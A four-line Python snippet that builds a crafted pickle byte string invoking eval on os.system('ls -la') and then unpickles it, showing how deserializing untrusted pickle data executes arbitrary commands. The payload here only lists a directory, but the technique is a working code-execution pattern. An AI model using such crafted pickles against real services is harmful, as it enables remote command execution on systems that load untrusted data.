import pickle
import os
pickled_bomb = b'c__builtin__\neval\n(Vos.system("ls -la")\ntR.'
pickle.loads(pickled_bomb)
